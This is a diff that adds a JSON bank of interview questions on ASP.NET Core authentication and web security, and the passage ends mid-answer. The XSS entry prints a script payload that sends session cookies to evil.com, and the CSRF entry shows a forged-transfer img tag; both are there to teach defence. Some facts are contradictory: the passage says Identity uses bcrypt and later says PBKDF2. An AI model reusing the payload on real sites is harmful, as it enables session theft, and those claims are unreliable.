@@ -1,0 +1,286 @@
+{
+  "categoryId": "auth",
+  "questions": [
+    {
+      "id": "auth-001",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "very-high",
+      "question": "What is JWT (JSON Web Token) and how does it work?",
+      "answer": "<p>JWT is a compact, self-contained token format used to securely transmit information between parties as a JSON object. It's the standard for stateless authentication in REST APIs.</p><p><strong>Structure:</strong> Three Base64URL-encoded parts separated by dots: <code>header.payload.signature</code></p><ul><li><strong>Header</strong> — algorithm + token type: <code>{\"alg\":\"HS256\",\"typ\":\"JWT\"}</code></li><li><strong>Payload</strong> — claims (user data): <code>{\"sub\":\"user123\",\"name\":\"Darsh\",\"role\":\"Admin\",\"exp\":1234567890}</code></li><li><strong>Signature</strong> — HMACSHA256(base64(header) + \".\" + base64(payload), secretKey) — verifies token wasn't tampered with</li></ul><p><strong>Authentication flow:</strong></p><ol><li>User sends credentials → API validates → issues JWT</li><li>Client stores JWT (localStorage or httpOnly cookie)</li><li>Client sends JWT in <code>Authorization: Bearer &lt;token&gt;</code> header on every request</li><li>API validates signature (no DB call needed!) + checks expiry → extracts claims</li></ol><p>In FolioTrack, JWTs contained: <code>sub</code> (userId), <code>email</code>, <code>role</code>, <code>exp</code> (15 min). Refresh tokens (stored in httpOnly cookies, DB-tracked) issued new access tokens without re-login.</p>",
+      "followUps": [
+        {
+          "question": "What are the standard JWT claims?",
+          "answer": "<p>JWT registered (standard) claims defined in RFC 7519: <strong>sub</strong> (subject — user ID), <strong>iss</strong> (issuer — who issued the token), <strong>aud</strong> (audience — who should accept it), <strong>exp</strong> (expiration time — Unix timestamp), <strong>nbf</strong> (not before — valid from this time), <strong>iat</strong> (issued at — Unix timestamp), <strong>jti</strong> (JWT ID — unique token identifier for revocation). Custom claims like <code>role</code>, <code>email</code>, <code>tenant_id</code> go in the payload alongside standard ones. Keep claims minimal — every claim adds bytes to every request.</p>"
+        },
+        {
+          "question": "What is the difference between signing and encryption?",
+          "answer": "<p><strong>Signing</strong> (default in JWT): The payload is Base64URL-encoded (NOT encrypted) and a signature is appended. Anyone can read the payload — it's visible if decoded. The signature just proves the token wasn't tampered with. <strong>Encryption</strong> (JWE — JSON Web Encryption): The payload itself is encrypted so only the recipient with the private key can read it. Standard JWTs are signed, not encrypted — never put sensitive data (passwords, PII) in a JWT payload. The <code>Authorization: Bearer</code> header should always be over HTTPS to prevent interception.</p>"
+        },
+        {
+          "question": "How do you invalidate a JWT before expiry?",
+          "answer": "<p>JWTs are stateless — the server cannot directly invalidate one without checking a database. Approaches: (1) <strong>Short expiry + refresh tokens</strong> — keep access tokens valid for 15 minutes; revoke the refresh token in the DB for logout. The access token expires naturally. (2) <strong>Token blocklist</strong> — maintain a Redis/DB set of revoked JTI values; check on each request. Adds a DB lookup, partially defeating stateless JWT benefits. (3) <strong>Rotate secrets</strong> — changing the signing key invalidates all tokens, but affects all users. For most apps, short-lived access tokens (15 min) with revocable refresh tokens is the right balance.</p>"
+        }
+      ],
+      "tip": "<strong>JWTs cannot be invalidated server-side</strong> (they're stateless). Keep access token expiry short (15min). Use refresh tokens in DB to support logout/revocation — revoke the refresh token, and the access token expires naturally.",
+      "tags": [
+        "jwt",
+        "auth",
+        "security",
+        "token"
+      ],
+      "sortOrder": 1,
+      "isActive": true
+    },
+    {
+      "id": "auth-002",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "very-high",
+      "question": "How do you implement JWT authentication in ASP.NET Core?",
+      "answer": "<p>Setting up JWT authentication in ASP.NET Core 8:</p><pre><code class=\"language-csharp\">// Program.cs\nbuilder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer(options =>\n    {\n        options.TokenValidationParameters = new TokenValidationParameters\n        {\n            ValidateIssuer = true,\n            ValidIssuer = builder.Configuration[\"Jwt:Issuer\"],\n            ValidateAudience = true,\n            ValidAudience = builder.Configuration[\"Jwt:Audience\"],\n            ValidateLifetime = true,\n            ValidateIssuerSigningKey = true,\n            IssuerSigningKey = new SymmetricSecurityKey(\n                Encoding.UTF8.GetBytes(builder.Configuration[\"Jwt:SecretKey\"]!)),\n            ClockSkew = TimeSpan.Zero  // no tolerance for expired tokens\n        };\n    });\n\n// Token generation\npublic string GenerateToken(ApplicationUser user)\n{\n    var claims = new[]\n    {\n        new Claim(JwtRegisteredClaimNames.Sub, user.Id),\n        new Claim(JwtRegisteredClaimNames.Email, user.Email!),\n        new Claim(ClaimTypes.Role, \"User\")\n    };\n    var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_secretKey));\n    var token = new JwtSecurityToken(\n        issuer: _issuer,\n        audience: _audience,\n        claims: claims,\n        expires: DateTime.UtcNow.AddMinutes(15),\n        signingCredentials: new SigningCredentials(key, SecurityAlgorithms.HmacSha256));\n    return new JwtSecurityTokenHandler().WriteToken(token);\n}</code></pre>",
+      "followUps": [
+        {
+          "question": "How do you read claims in a controller?",
+          "answer": "<p>The <code>User</code> property on <code>ControllerBase</code> is a <code>ClaimsPrincipal</code> populated by the JWT middleware. Read claims with: <code>User.FindFirstValue(ClaimTypes.NameIdentifier)</code> (user ID from the <code>sub</code> claim), <code>User.FindFirstValue(ClaimTypes.Email)</code> (email), <code>User.IsInRole(\"Admin\")</code> (role check), <code>User.Claims</code> (all claims as IEnumerable). <code>FindFirstValue</code> returns null if the claim doesn't exist. For custom claims, use the claim type string: <code>User.FindFirstValue(\"tenant_id\")</code>. The claim types must match what you put in the JWT when generating it.</p>"
+        },
+        {
+          "question": "What is ClaimsPrincipal?",
+          "answer": "<p><code>ClaimsPrincipal</code> represents the authenticated user as a collection of <code>ClaimsIdentity</code> objects (multiple identities for federated scenarios). Each <code>ClaimsIdentity</code> is a collection of <code>Claim</code> objects (key-value pairs about the user). The JWT middleware, after validating the token, creates a <code>ClaimsIdentity</code> from the JWT claims and sets <code>HttpContext.User</code> to a <code>ClaimsPrincipal</code> wrapping it. <code>User.Identity.IsAuthenticated</code> returns true if at least one identity was successfully authenticated. This is the foundation of ASP.NET Core's claims-based authorization system.</p>"
+        }
+      ],
+      "tip": "<strong>Read claims in controllers:</strong> <code>User.FindFirstValue(ClaimTypes.NameIdentifier)</code> gets the user ID. <code>User.IsInRole(\"Admin\")</code> checks roles. <code>User.Claims</code> for all claims. The <code>User</code> property is a <code>ClaimsPrincipal</code> populated by the JWT middleware.",
+      "tags": [
+        "jwt",
+        "auth",
+        "aspnetcore",
+        "security"
+      ],
+      "sortOrder": 2,
+      "isActive": true
+    },
+    {
+      "id": "auth-003",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is the difference between Authentication and Authorization?",
+      "answer": "<p>These are different steps in the security pipeline that are often confused:</p><p><strong>Authentication</strong> — verifying WHO the user is. \"Are you who you claim to be?\" Methods: username+password, JWT, OAuth, biometrics. Result: a verified identity (ClaimsPrincipal in ASP.NET Core).</p><p><strong>Authorization</strong> — verifying WHAT the authenticated user can do. \"Are you allowed to do this?\" Methods: roles, claims, policies, resource-based authorization.</p><pre><code class=\"language-csharp\">// Authentication: verify identity\napp.UseAuthentication();  // sets HttpContext.User from JWT\n\n// Authorization: enforce what they can do\napp.UseAuthorization();\n\n// Role-based authorization\n[Authorize(Roles = \"Admin\")]\npublic IActionResult AdminOnly() { ... }\n\n// Policy-based authorization\n[Authorize(Policy = \"CanEditPortfolio\")]\npublic IActionResult Edit(int id) { ... }\n\n// Register policy\nbuilder.Services.AddAuthorization(options =>\n{\n    options.AddPolicy(\"CanEditPortfolio\", policy =>\n        policy.RequireClaim(\"PortfolioOwner\"));\n});</code></pre><p>In WalletVerification: <strong>Authentication</strong> = validating the OIDC token from the identity provider. <strong>Authorization</strong> = checking that the authenticated user's <code>sub</code> claim matches the wallet they're trying to access (resource-based authorization).</p>",
+      "followUps": [
+        {
+          "question": "What is resource-based authorization?",
+          "answer": "<p>Resource-based authorization checks whether a specific user can perform an action on a specific resource instance — not just role/claim checks. Example: \"Can user 42 edit portfolio 17?\" (only if they own it). Implemented via <code>IAuthorizationService</code>: inject it, define a requirement (<code>IAuthorizationRequirement</code>), write a handler (<code>AuthorizationHandler&lt;T, Resource&gt;</code>) that checks the resource's owner against the current user's ID, then call <code>await _authorizationService.AuthorizeAsync(User, portfolio, \"OwnerPolicy\")</code>. Return 403 if authorization fails. This is the correct way to implement row-level security in ASP.NET Core.</p>"
+        },
+        {
+          "question": "What is an IAuthorizationHandler?",
+          "answer": "<p><code>IAuthorizationHandler</code> contains the logic for evaluating a specific <code>IAuthorizationRequirement</code>. You implement <code>AuthorizationHandler&lt;TRequirement&gt;</code> (for simple policy checks) or <code>AuthorizationHandler&lt;TRequirement, TResource&gt;</code> (for resource-based checks). In <code>HandleRequirementAsync</code>, call <code>context.Succeed(requirement)</code> if authorization passes, or simply return (fail silently). Register handlers in DI: <code>services.AddSingleton&lt;IAuthorizationHandler, PortfolioOwnerHandler&gt;()</code>. Multiple handlers can evaluate the same requirement — all must succeed unless the policy uses <code>RequireAssertion</code>.</p>"
+        }
+      ],
+      "tip": "<strong>HTTP 401 vs 403:</strong> Authentication failure → 401 Unauthorized (\"who are you?\"). Authorization failure → 403 Forbidden (\"I know who you are, but you can't do this\"). Using the wrong code leaks information — returning 403 for unauthenticated requests tells attackers the endpoint exists.",
+      "tags": [
+        "auth",
+        "authentication",
+        "authorization",
+        "aspnetcore"
+      ],
+      "sortOrder": 3,
+      "isActive": true
+    },
+    {
+      "id": "auth-004",
+      "category": "auth",
+      "difficulty": "hard",
+      "frequency": "high",
+      "question": "What is OAuth 2.0 and how does it differ from OIDC?",
+      "answer": "<p><strong>OAuth 2.0</strong> is an authorization framework — it allows a third-party app to get limited access to a user's resources on another service without exposing credentials. It's about <em>delegated authorization</em>, not authentication.</p><p><strong>OAuth 2.0 Authorization Code Flow:</strong></p><ol><li>User clicks \"Login with Google\" in your app</li><li>App redirects to Google's authorization endpoint</li><li>User logs in to Google and consents to permissions</li><li>Google redirects back with an authorization code</li><li>App exchanges code for access token (server-to-server, no user involved)</li><li>App uses access token to call Google APIs on behalf of the user</li></ol><p><strong>OpenID Connect (OIDC)</strong> — an identity layer on top of OAuth 2.0. Adds authentication: after the flow, you receive an <strong>ID Token</strong> (JWT) containing who the user is (sub, email, name). OAuth gives you access tokens to call APIs. OIDC adds identity tokens to know who logged in.</p><p>In WalletVerification I configured ASP.NET Core's OIDC handler to authenticate users via an external identity provider. The ID token told us who the user was; the access token let us call the provider's API.</p>",
+      "followUps": [
+        {
+          "question": "What is PKCE and why is it required for SPAs?",
+          "answer": "<p>PKCE (Proof Key for Code Exchange, pronounced \"pixie\") prevents authorization code interception attacks in public clients (SPAs, mobile apps) that cannot store a client secret securely. The client generates a random <code>code_verifier</code>, hashes it to get a <code>code_challenge</code>, and sends the challenge with the authorization request. When exchanging the code for a token, the client proves it has the original verifier — the auth server matches the hash. If an attacker intercepts the authorization code, they cannot use it without the code_verifier. PKCE is mandatory for SPAs in OAuth 2.1 and required by all modern identity providers.</p>"
+        },
+        {
+          "question": "What is the difference between access token and ID token?",
+          "answer": "<p><strong>Access token</strong> — a credential for calling APIs. Its contents are opaque to the client (they're for the resource server). OAuth 2.0 doesn't define what's inside an access token. Use it in <code>Authorization: Bearer</code> headers. <strong>ID token</strong> — a JWT that identifies who authenticated. It's OIDC-specific and defined by the spec. Contains claims about the user (sub, email, name, picture). Intended for the client application to display user info — not for calling APIs. Never use an access token to identify a user, and never send an ID token to APIs. They have different audiences and purposes.</p>"
+        }
+      ],
+      "tip": "<strong>Never use the access token to get user identity.</strong> Access tokens are for calling APIs — their content is undefined by OAuth. Use the ID token (OIDC) or a /userinfo endpoint for identity. This is a common OAuth misuse.",
+      "tags": [
+        "oauth",
+        "oidc",
+        "auth",
+        "security"
+      ],
+      "sortOrder": 4,
+      "isActive": true
+    },
+    {
+      "id": "auth-005",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is ASP.NET Core Identity and when would you use it?",
+      "answer": "<p><strong>ASP.NET Core Identity</strong> is the built-in membership system for managing users, passwords, roles, and claims. It provides: user registration/login, password hashing (bcrypt), email confirmation, 2FA, roles, claims, external login (Google, Facebook via OAuth).</p><pre><code class=\"language-csharp\">// Setup\nbuilder.Services.AddDefaultIdentity&lt;ApplicationUser&gt;(options =>\n{\n    options.Password.RequiredLength = 8;\n    options.Password.RequireNonAlphanumeric = false;\n    options.SignIn.RequireConfirmedAccount = false;\n    options.Lockout.MaxFailedAccessAttempts = 5;\n})\n.AddRoles&lt;IdentityRole&gt;()\n.AddEntityFrameworkStores&lt;ApplicationDbContext&gt;();\n\n// Usage in controller\npublic async Task&lt;IActionResult&gt; Register(RegisterViewModel model)\n{\n    var user = new ApplicationUser { UserName = model.Email, Email = model.Email };\n    var result = await _userManager.CreateAsync(user, model.Password);\n    if (result.Succeeded)\n    {\n        await _signInManager.SignInAsync(user, isPersistent: false);\n        return RedirectToAction(\"Index\", \"Home\");\n    }\n    foreach (var error in result.Errors)\n        ModelState.AddModelError(string.Empty, error.Description);\n    return View(model);\n}</code></pre><p><strong>When to use:</strong> Self-hosted authentication where you own the user database. If you need external identity providers (Azure AD, Auth0), use OIDC instead and skip Identity's password management.</p>",
+      "followUps": [
+        {
+          "question": "What is the difference between UserManager and SignInManager?",
+          "answer": "<p><code>UserManager&lt;T&gt;</code> manages the user data store — create, update, delete users, change passwords, add/remove claims and roles, confirm email, generate password reset tokens. It's not aware of HTTP or cookies. <code>SignInManager&lt;T&gt;</code> handles the authentication process — sign in (issue cookie), sign out (clear cookie), external login callbacks, two-factor authentication. It uses <code>UserManager</code> internally. Rule of thumb: if you're managing user data → <code>UserManager</code>. If you're managing the user's session → <code>SignInManager</code>. For JWT APIs, you often use only <code>UserManager</code> (to validate credentials) and issue JWTs manually, skipping <code>SignInManager</code>.</p>"
+        },
+        {
+          "question": "How does Identity store passwords?",
+          "answer": "<p>ASP.NET Core Identity uses <strong>PBKDF2 with HMAC-SHA256</strong> (not bcrypt, despite common references). The hash includes a random salt and is iterated 100,000 times (configurable). The full representation stored is: <code>algorithm_marker | salt | hash</code> — all Base64-encoded in a single column. The algorithm marker allows the hashing algorithm to be upgraded over time without breaking existing accounts. When a user logs in, Identity rehashes the provided password with the stored salt and compares — if different, password is wrong. Never implement your own password hashing — Identity's implementation is audited and upgradeable.</p>"
+        }
+      ],
+      "tip": "<strong>Identity uses bcrypt for password hashing</strong> (via ASP.NET Core Data Protection). Never store plain passwords or use MD5/SHA1 — Identity's default is already secure. The hash is adaptive (work factor increases over time).",
+      "tags": [
+        "auth",
+        "identity",
+        "aspnetcore",
+        "security"
+      ],
+      "sortOrder": 5,
+      "isActive": true
+    },
+    {
+      "id": "auth-006",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What are claims and how are they used in ASP.NET Core authorization?",
+      "answer": "<p>A <strong>claim</strong> is a key-value statement about a user made by a trusted authority. Claims are carried in tokens (JWT, cookies) and represent facts about the user.</p><p><strong>Common claims:</strong> <code>sub</code> (subject/user ID), <code>email</code>, <code>role</code>, <code>given_name</code>, custom claims like <code>tenant_id</code>, <code>subscription_level</code>.</p><p><strong>Claims-based authorization:</strong></p><pre><code class=\"language-csharp\">// Policy requiring a specific claim\nbuilder.Services.AddAuthorization(options =>\n{\n    options.AddPolicy(\"PremiumUser\", policy =>\n        policy.RequireClaim(\"subscription\", \"premium\", \"enterprise\"));\n\n    options.AddPolicy(\"MinAge18\", policy =>\n        policy.RequireAssertion(ctx =>\n        {\n            var dob = ctx.User.FindFirstValue(\"birthdate\");\n            return dob != null && DateTime.Parse(dob) <= DateTime.Now.AddYears(-18);\n        }));\n});\n\n// Apply to controller/action\n[Authorize(Policy = \"PremiumUser\")]\npublic IActionResult PremiumFeature() { ... }\n\n// Read claims in controller\nvar userId = User.FindFirstValue(ClaimTypes.NameIdentifier);\nvar email = User.FindFirstValue(ClaimTypes.Email);\nvar tenantId = User.FindFirstValue(\"tenant_id\");</code></pre><p>In WalletVerification, the JWT contained a <code>wallet_id</code> claim. Authorization policies verified that the requested wallet ID matched the claim — preventing users from accessing other wallets.</p>",
+      "followUps": [
+        {
+          "question": "What is the difference between role-based and claim-based authorization?",
+          "answer": "<p><strong>Role-based authorization</strong> — users are assigned to named roles (Admin, User, Manager), and access is granted based on role membership. Simple but coarse-grained. <code>[Authorize(Roles = \"Admin\")]</code>. Roles are themselves a type of claim (<code>ClaimTypes.Role</code>). <strong>Claim-based authorization</strong> — access decisions based on any claim value (country, subscription tier, age, employee department). More fine-grained and flexible. Policies express complex conditions across multiple claims. In practice, use roles for broad access levels (Admin vs User) and claims for fine-grained feature flags (subscription tier, tenant membership, feature flags). ASP.NET Core supports both simultaneously.</p>"
+        },
+        {
+          "question": "What is an IAuthorizationRequirement?",
+          "answer": "<p><code>IAuthorizationRequirement</code> is a marker interface representing a condition that must be met for authorization to succeed. It's a data class — typically a record or class with properties describing the requirement (e.g., <code>MinimumAgeRequirement(int minimumAge)</code>). The actual evaluation logic lives in <code>AuthorizationHandler&lt;TRequirement&gt;</code>. This separation allows multiple handlers to evaluate the same requirement (OR logic) or different requirements to reuse the same handler. Registered in DI via <code>services.AddSingleton&lt;IAuthorizationHandler, MinimumAgeHandler&gt;()</code>. Added to policies via <code>policy.AddRequirements(new MinimumAgeRequirement(18))</code>.</p>"
+        }
+      ],
+      "tip": "<strong>Claims are extensible but keep them small.</strong> Every claim is in every request (in the JWT). Don't put large data in claims — put a user ID and look up details per-request from cache. A JWT with 50 claims is a red flag.",
+      "tags": [
+        "auth",
+        "claims",
+        "authorization",
+        "aspnetcore"
+      ],
+      "sortOrder": 6,
+      "isActive": true
+    },
+    {
+      "id": "auth-007",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is CSRF (Cross-Site Request Forgery) and how do you prevent it in ASP.NET Core?",
+      "answer": "<p>CSRF is an attack where a malicious site tricks an authenticated user's browser into making a request to <em>your</em> site without their knowledge. The browser automatically sends cookies — including the session or auth cookie — on every request to your domain. An attacker exploits this.</p><h4>Classic CSRF attack scenario:</h4><ol><li>User logs into your banking app. Their session cookie is stored in the browser.</li><li>User visits a malicious site (in another tab) that contains: <code>&lt;img src=\"https://yourbank.com/transfer?to=attacker&amp;amount=5000\"&gt;</code></li><li>Browser sees the img tag, fires a GET to your bank. Cookie goes along automatically.</li><li>Bank sees a valid authenticated request — money transferred.</li></ol><h4>How ASP.NET Core prevents it — Anti-Forgery Tokens:</h4><p>The server generates a unique token, puts it in a hidden form field AND stores it in a cookie. On POST, both must match. The attacker's site can't read your cookies (same-origin policy), so it can't get the token to include in the forged request.</p><pre><code class=\"language-csharp\">// In Program.cs — anti-forgery is registered automatically with AddControllersWithViews()\nbuilder.Services.AddControllersWithViews();\n\n// In Razor form — @Html.AntiForgeryToken() or asp-antiforgery=\"true\" on form tag\n// Tag helper approach (preferred):\n&lt;form asp-action=\"Transfer\" method=\"post\"&gt;\n    &lt;!-- framework auto-injects hidden __RequestVerificationToken field --&gt;\n    &lt;input name=\"Amount\" /&gt;\n    &lt;button type=\"submit\"&gt;Transfer&lt;/button&gt;\n&lt;/form&gt;\n\n// Controller — validate the token\n[HttpPost]\n[ValidateAntiForgeryToken] // throws 400 if token missing/invalid\npublic IActionResult Transfer(TransferViewModel model) { }\n\n// Global for all POST actions\nbuilder.Services.AddControllersWithViews(options =>\n    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute()));</code></pre><h4>CSRF with APIs (JWT):</h4><p>If your API uses JWT Bearer tokens (not cookies), CSRF is generally not a concern — browsers don't auto-send Authorization headers. CSRF only applies when auth is cookie-based. For SPAs calling APIs with JWT in headers, you're already safe.</p><p>If you use cookie-based auth with an API, add the <code>SameSite=Strict</code> or <code>SameSite=Lax</code> cookie attribute — modern browsers block cross-site cookies by default.</p>",
+      "followUps": [
+        {
+          "question": "What is the SameSite cookie attribute and how does it help against CSRF?",
+          "answer": "<p><code>SameSite</code> is a cookie attribute that tells browsers when to include the cookie in cross-site requests:</p><ul><li><code>SameSite=Strict</code> — cookie only sent for same-site requests. Visiting yourbank.com from a link on another site won't send the cookie. Most secure but can break legitimate cross-origin flows like OAuth redirects.</li><li><code>SameSite=Lax</code> — cookie sent for same-site requests and top-level navigation GET requests (clicking a link). The default in modern browsers. Blocks cross-site POSTs, which stops most CSRF attacks.</li><li><code>SameSite=None</code> — cookie sent everywhere. Must also set <code>Secure</code>. Use only for legitimate cross-site scenarios like third-party auth.</li></ul><pre><code class=\"language-csharp\">builder.Services.ConfigureApplicationCookie(opts =>\n{\n    opts.Cookie.SameSite = SameSiteMode.Strict;\n    opts.Cookie.SecurePolicy = CookieSecurePolicy.Always;\n    opts.Cookie.HttpOnly = true;\n});</code></pre>"
+        }
+      ],
+      "tip": "<strong>CSRF only applies to cookie auth.</strong> If your API uses JWT in Authorization headers, CSRF doesn't apply — attackers can't make browsers send custom headers cross-origin. Focus CSRF protection on MVC apps with cookie-based sessions.",
+      "tags": [
+        "csrf",
+        "security",
+        "antiforgery",
+        "cookies",
+        "auth"
+      ],
+      "sortOrder": 7,
+      "isActive": true
+    },
+    {
+      "id": "auth-008",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is XSS (Cross-Site Scripting) and how do you prevent it in ASP.NET Core?",
+      "answer": "<p>XSS is when an attacker injects malicious JavaScript into your web page, and that script runs in other users' browsers. It's one of the most common web vulnerabilities — OWASP Top 10 every year.</p><h4>How XSS works:</h4><p>Your site displays user-supplied content (a comment, a username, a search query). If you render it as raw HTML without encoding, an attacker can submit: <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. When other users view the page, their browser executes that script. The attacker now has their session cookies.</p><h4>Types of XSS:</h4><ul><li><strong>Stored XSS</strong> — malicious script saved to DB, served to every user who views that content. Most dangerous.</li><li><strong>Reflected XSS</strong> — malicious script in a URL parameter, reflected back in the response. Example: <code>/search?q=&lt;script&gt;...&lt;/script&gt;</code></li><li><strong>DOM-based XSS</strong> — script manipulates the DOM client-side via JavaScript, never touches the server.</li></ul><h4>Prevention in ASP.NET Core:</h4><h5>1. Razor auto-encoding (your first line of defence)</h5><pre><code class=\"language-html\">&lt;!-- Razor encodes by default -- safe --&gt;\n&lt;p&gt;Hello, @Model.UserName&lt;/p&gt;\n&lt;!-- If UserName = \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n     Renders as: Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; -- harmless text --&gt;\n\n&lt;!-- DANGEROUS -- bypasses encoding, only for trusted HTML --&gt;\n&lt;p&gt;@Html.Raw(Model.HtmlContent)&lt;/p&gt; // only use if content is from a trusted source</code></pre><h5>2. Content Security Policy (CSP) header</h5><pre><code class=\"language-csharp\">// Tells the browser only execute scripts from your own domain\napp.Use(async (context, next) =&gt;\n{\n    context.Response.Headers.Add(\n        \"Content-Security-Policy\",\n        \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\");\n    await next();\n});</code></pre><h5>3. HtmlEncoder for manual encoding</h5><pre><code class=\"language-csharp\">using System.Text.Encodings.Web;\n\n// In a service/controller where you need to manually encode\nstring safe = HtmlEncoder.Default.Encode(userInput);\n// &lt;script&gt;alert(1)&lt;/script&gt; → &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></pre><h5>4. Input validation + sanitisation for rich text</h5><p>If you allow rich HTML (like a WYSIWYG editor), use a whitelist sanitiser — the <strong>HtmlSanitizer</strong> NuGet package is the standard for this in .NET. Never try to build your own HTML sanitiser with regex.</p><h4>HttpOnly cookies for session protection:</h4><p>Even if XSS happens, <code>HttpOnly</code> cookies can't be read by JavaScript — limiting the damage. Always set cookies as HttpOnly.</p>",
+      "followUps": [
+        {
+          "question": "What is the difference between XSS and SQL injection? Both involve injecting malicious code.",
+          "answer": "<p>Different targets, different vectors, different defences:</p><ul><li><strong>SQL Injection</strong> — malicious input gets executed by the <em>database</em>. Attacker injects SQL syntax into an input field that ends up in a SQL query. Defence: parameterised queries / ORMs (EF Core, Dapper).</li><li><strong>XSS</strong> — malicious input gets executed by the <em>browser</em> as JavaScript. Attacker injects script tags or event handlers into content that gets rendered as HTML. Defence: output encoding (Razor does this by default), CSP headers, input sanitisation for rich text.</li></ul><p>Both exploits work by <strong>trusting user input</strong> and treating data as code. The principle is the same: never trust user input, always encode/parameterise output appropriately for its context.</p>"
+        }
+      ],
+      "tip": "<strong>Razor encodes by default — that's your safety net.</strong> The risk is when you use @Html.Raw(), JavaScript inline rendering, or Angular/React's dangerouslySetInnerHTML. Always be explicit when bypassing encoding — treat it like using 'unsafe' in C#.",
+      "tags": [
+        "xss",
+        "security",
+        "csp",
+        "encoding",
+        "html"
+      ],
+      "sortOrder": 8,
+      "isActive": true
+    },
+    {
+      "id": "auth-009",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is the structure of a JWT token? Explain Header, Payload, and Signature.",
+      "answer": "<p>A JWT (JSON Web Token) is three Base64Url-encoded JSON objects concatenated with dots: <code>Header.Payload.Signature</code></p>\n\n<h4>The three parts:</h4>\n<pre><code>// Full JWT looks like this:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJuYW1lIjoiSm9obiIsInJvbGUiOiJBZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>\n\n<h4>1. Header — algorithm metadata</h4>\n<pre><code>{\n  \"alg\": \"HS256\",   // HMAC SHA-256 (symmetric) or RS256 (asymmetric)\n  \"typ\": \"JWT\"\n}</code></pre>\n\n<h4>2. Payload — claims (the actual data)</h4>\n<pre><code>{\n  \"sub\": \"user-123\",        // Subject — usually user ID\n  \"name\": \"John Darshan\",   // Custom claim\n  \"email\": \"john@abc.com\",\n  \"role\": \"Admin\",          // Custom claim for authorization\n  \"iat\": 1700000000,        // Issued At (Unix timestamp)\n  \"exp\": 1700003600,        // Expiry (1 hour from iat)\n  \"iss\": \"myapp.com\",       // Issuer\n  \"aud\": \"myapp-api\"        // Audience\n}</code></pre>\n\n<h4>3. Signature — tamper protection</h4>\n<pre><code>// For HS256 (symmetric — same secret for sign and verify):\nHMACSHA256(\n    base64url(header) + \".\" + base64url(payload),\n    secretKey\n)\n\n// For RS256 (asymmetric — sign with private key, verify with public key):\n// Private key signs → Public key verifies\n// Better for microservices where multiple services verify tokens</code></pre>\n\n<h4>Key security points:</h4>\n<ul>\n<li>The payload is <strong>Base64 encoded, NOT encrypted</strong> — anyone can decode it. Never put passwords or sensitive PII in JWT payload</li>\n<li>The signature <em>proves integrity</em> — if anyone tampers with header or payload, signature validation fails</li>\n<li>Short expiry (15-60 min) + refresh tokens = best practice</li>\n</ul>\n\n<h4>In ASP.NET Core — reading claims from JWT:</h4>\n<pre><code>[HttpGet(\"profile\")]\n[Authorize]\npublic IActionResult GetProfile()\n{\n    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;\n    var email  = User.FindFirst(ClaimTypes.Email)?.Value;\n    var role   = User.FindFirst(ClaimTypes.Role)?.Value;\n    \n    return Ok(new { userId, email, role });\n}</code></pre>\n\n<p>I use jwt.io to decode tokens during debugging — you paste the token and see the header and payload instantly. Remember: the decoded payload is visible to anyone, so treat it as public data.</p>",
+      "followUps": [
+        {
+          "question": "What is the difference between HS256 and RS256 signing algorithms?",
+          "answer": ""
+        },
+        {
+          "question": "Why should JWT expiry be short? What is the recommended lifetime?",
+          "answer": ""
+        },
+        {
+          "question": "How do you revoke a JWT before it expires?",
+          "answer": ""
+        }
+      ],
+      "tip": "JWT payload is Base64 encoded, NOT encrypted. Never store passwords or credit cards in it. Use short expiry (15-60 min) + refresh tokens.",
+      "tags": [
+        "auth",
+        "jwt",
+        "header",
+        "payload",
+        "signature",
+        "claims",
+        "token"
+      ],
+      "sortOrder": 9,
+      "isActive": true
+    },
+    {
+      "id": "auth-010",
+      "category": "auth",
+      "difficulty": "medium",
+      "frequency": "high",
+      "question": "What is a Refresh Token? How do you implement token refresh in ASP.NET Core?",
+      "answer": "<p>A refresh token is a long-lived credential used to obtain new access tokens (JWTs) without requiring the user to log in again. It solves the problem of short-lived JWTs — you want short expiry for security but don't want to force re-login every 15 minutes.</p>\n\n<h4>The token flow:</h4>\n<pre><code>// 1. Login — server returns both tokens\nPOST /api/auth/login\n→ {\n    \"accessToken\": \"eyJ...\",   // short-lived, e.g. 15 minutes\n    \"refreshToken\": \"abc123...\", // long-lived, e.g. 7-30 days\n    \"expiresIn\": 900\n  }\n\n// 2. Use access token for API calls\nGET /api/orders\nAuthorization: Bearer eyJ...\n\n// 3. When access token expires — use refresh token to get a new one\nPOST /api/auth/refresh\n{ \"refreshToken\": \"abc123...\" }\n→ {\n    \"accessToken\": \"eyJ...(new token)\",\n    \"refreshToken\": \"xyz789...(rotated refresh token)\"\n  }\n\n// 4. On logout — revoke refresh token\nPOST /api/auth/logout\n{ \"refreshToken\": \"xyz789...\" }</code></pre>\n\n<h4>Implementation in ASP.NET Core:</h4>\n<pre><code>// Store refresh tokens in DB (hashed)\npublic class RefreshToken\n{\n    public int Id { get; set; }\n    public string TokenHash { get; set; }  // bcrypt hash of token\n    public string UserId { get; set; }\n    public DateTime ExpiresAt { get; set; }\n    public bool IsRevoked { get; set; }\n    public DateTime CreatedAt { get; set; }\n}\n\n// Refresh endpoint\n[HttpPost(\"refresh\")]\n[AllowAnonymous]\npublic async Task&lt;IActionResult&gt; Refresh([FromBody] RefreshRequest request)\n{\n    var tokenHash = 